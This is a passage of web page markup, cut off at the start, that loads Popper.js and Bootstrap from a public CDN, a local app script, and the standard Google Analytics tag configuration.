src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-79SMBN4E7F"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-79SMBN4E7F'); }); </script>
